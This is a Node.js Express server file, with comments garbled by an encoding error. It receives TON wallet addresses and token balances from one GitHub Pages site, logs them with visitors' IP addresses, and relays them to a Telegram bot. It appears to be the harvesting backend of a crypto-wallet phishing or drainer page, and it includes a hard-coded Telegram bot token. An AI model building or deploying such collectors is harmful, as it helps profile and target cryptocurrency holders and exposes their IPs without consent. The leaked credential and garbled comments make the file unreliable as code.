// –≠—Ç–æ—Ç —Ñ–∞–π–ª –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è Node.js —Å–µ—Ä–≤–µ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∏—Ö –≤ Telegram

const express = require("express")
const cors = require("cors")
const axios = require("axios")
const bodyParser = require("body-parser")
const fs = require("fs")

const app = express()
const PORT = process.env.PORT || 3000

// –ù–∞—Å—Ç—Ä–æ–π–∫–∞ CORS –¥–ª—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∑–∞–ø—Ä–æ—Å–æ–≤ —Ç–æ–ª—å–∫–æ —Å –≤–∞—à–µ–≥–æ –¥–æ–º–µ–Ω–∞
app.use(
  cors({
    origin: "https://heronwaterwow.github.io",
  }),
)

app.use(bodyParser.json())

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ POST –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –¥–∞–Ω–Ω—ã–º–∏ –∫–æ—à–µ–ª—å–∫–∞
app.post("/api/ton-wallet-data", async (req, res) => {
  try {
    const { address, tokens, timestamp } = req.body

    if (!address || !tokens) {
      return res.status(400).json({ success: false, error: "–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–∞–Ω–Ω—ã–µ" })
    }

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
    const logData = {
      timestamp: timestamp || new Date().toISOString(),
      address,
      tokens,
      ip: req.ip,
    }

    fs.appendFileSync("ton_wallet_log.json", JSON.stringify(logData) + "\n")

    // –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è Telegram
    let message = `üîî *–ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞ TON*\n\n`
    message += `üìù *–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞:* \`${address}\`\n\n`
    message += `üí∞ *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ç–æ–∫–µ–Ω–∞—Ö:*\n`

    tokens.forEach((token) => {
      message += `- *${token.name}* (${token.symbol}): ${token.balance}\n`
    })

    // –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –≤—Ä–µ–º–µ–Ω–∏ –∏ IP
    message += `\n‚è∞ *–í—Ä–µ–º—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:* ${new Date().toLocaleString()}`
    message += `\nüåê *IP –∞–¥—Ä–µ—Å:* ${req.ip}`

    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
    const telegramBotToken = "7534217100:AAGxLkFH_r8NzHSD-kXnZhs6rrSZjES9IUQ"
    const chatId = "5555555555" // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à chat_id

    const telegramResponse = await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    })

    if (telegramResponse.data.ok) {
      return res.json({ success: true, message: "–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram" })
    } else {
      return res.status(500).json({ success: false, error: "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram" })
    }
  } catch (error) {
    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –∑–∞–ø—Ä–æ—Å–∞:", error)
    return res.status(500).json({ success: false, error: "–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞" })
  }
})

// –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
app.listen(PORT, () => {
  console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`)
})
